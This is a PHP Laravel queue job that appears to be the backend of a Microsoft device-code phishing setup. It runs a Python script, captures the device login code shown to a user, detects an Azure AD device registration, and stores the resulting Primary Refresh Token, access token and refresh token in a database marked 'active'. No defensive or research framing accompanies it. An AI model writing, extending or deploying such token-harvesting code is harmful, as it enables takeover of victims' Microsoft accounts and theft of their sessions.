<?php

namespace App\Jobs;

use App\Models\CommandJob;
use App\Models\Token;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Log;
use Symfony\Component\Process\Process;

class RunPythonCommandJob implements ShouldQueue
{
    use Queueable;

    public $timeout = 300;
    protected $jobId;

    public function __construct($jobId)
    {
        $this->jobId = $jobId;
    }

    public function handle(): void
    {
        $job = CommandJob::find($this->jobId);
        if (!$job) return;

        $job->update([
            'status' => 'running',
            'started_at' => now()
        ]);

        $tempDir = storage_path('app/tmp/' . Str::uuid());

        try {

            File::makeDirectory($tempDir, 0777, true, true);

            // ============================
            // 🚀 RUN PYTHON (FIXED)
            // ============================
            $process = new Process([
                base_path('venv/bin/python'),
                '-u',
                base_path('main.py')
            ]);

            $process->setWorkingDirectory($tempDir);
            $process->setTimeout(null);

            $outputBuffer = '';
            $startTime = time();

            // ============================
            // 🔥 REALTIME STREAM (FIX)
            // ============================
            $process->run(function ($type, $data) use (&$outputBuffer, $job, $startTime) {

                $outputBuffer .= $data;

                // DEBUG STREAM
                Log::info('[PYTHON STREAM]', [
                    'chunk' => $data
                ]);

                // ============================
                // 🎯 USER CODE DETECTION
                // ============================
                if (!$job->user_code) {

                    if (preg_match('/code ([A-Z0-9]{8,})/i', $outputBuffer, $match)) {

                        $job->update([
                            'user_code' => $match[1],
                            'verification_uri' => 'https://login.microsoft.com/device'
                        ]);

                        Log::info('[CODE DETECTED]', [
                            'code' => $match[1]
                        ]);
                    }
                }

                // ============================
                // ⏱️ TIMEOUT CHECK
                // ============================
                if (!$job->login_detected_at) {

                    if ((time() - $startTime) > $job->timeout_seconds) {

                        throw new \Exception("Login timeout");
                    }
                }

                // ============================
                // ✅ LOGIN DETECT
                // ============================
                if (
                    !$job->login_detected_at &&
                    str_contains($outputBuffer, 'Registering azuread devices')
                ) {
                    $job->update([
                        'login_detected_at' => now()
                    ]);
                }
            });

            // ============================
            // ❌ PROCESS ERROR
            // ============================
            if (!$process->isSuccessful()) {

                Log::error("PYTHON FAILED", [
                    'output' => $outputBuffer,
                    'error_output' => $process->getErrorOutput()
                ]);

                throw new \Exception(
                    $process->getErrorOutput() ?: $outputBuffer
                );
            }

            // ============================
            // 🔥 PARSE JSON OUTPUT
            // ============================
            if (!preg_match('/PRT_JSON_START(.*?)PRT_JSON_END/s', $outputBuffer, $match)) {
                throw new \Exception("JSON output not found from Python");
            }

            $json = trim($match[1]);
            $prtData = json_decode($json, true);

            if (!$prtData) {
                throw new \Exception("Invalid JSON from Python");
            }

            if (isset($prtData['error'])) {
                throw new \Exception($prtData['error']);
            }

            // ============================
            // 🔥 TOKENS
            // ============================
            $accessToken = $prtData['access_token'] ?? null;
            $refreshToken = $prtData['refresh_token'] ?? null;

            if (!$refreshToken && isset($prtData['prt']['refresh_token'])) {
                $refreshToken = $prtData['prt']['refresh_token'];
            }

            if (!$accessToken) {
                throw new \Exception("Access token not generated");
            }

            // ============================
            // 💾 SAVE TOKEN
            // ============================
            Token::create([
                'user_id' => $job->user_id,
                'prt' => json_encode($prtData['prt']),
                'access_token' => $accessToken,
                'refresh_token' => $refreshToken,
                'expires_at' => now()->addMinutes(50),
                'status' => 'active'
            ]);

            // ============================
            // ✅ SUCCESS
            // ============================
            $job->update([
                'status' => 'success',
                'output' => $outputBuffer
            ]);

        } catch (\Exception $e) {

            Log::error('[JOB FAILED]', [
                'error' => $e->getMessage()
            ]);

            $job->update([
                'status' => 'failed',
                'error' => $e->getMessage()
            ]);

        } finally {
            // optional cleanup
            // File::deleteDirectory($tempDir);
        }
    }
}